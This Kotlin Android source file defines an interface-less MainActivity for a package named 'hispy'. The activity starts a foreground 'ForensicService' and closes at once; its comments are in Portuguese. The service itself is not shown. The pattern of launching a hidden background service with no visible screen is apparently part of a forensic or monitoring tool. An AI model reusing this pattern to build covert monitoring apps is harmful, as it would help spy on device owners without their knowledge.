package com.ufc.hispy

import android.app.Activity
import android.content.Intent
import android.os.Bundle

/**
 * Activity principal sem interface
 * Inicia o serviço forense em background e fecha imediatamente
 */
class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Iniciar serviço forense
        val intent = Intent(this, ForensicService::class.java)
        startForegroundService(intent)
        
        // Fechar activity (sem interface)
        finish()
    }
}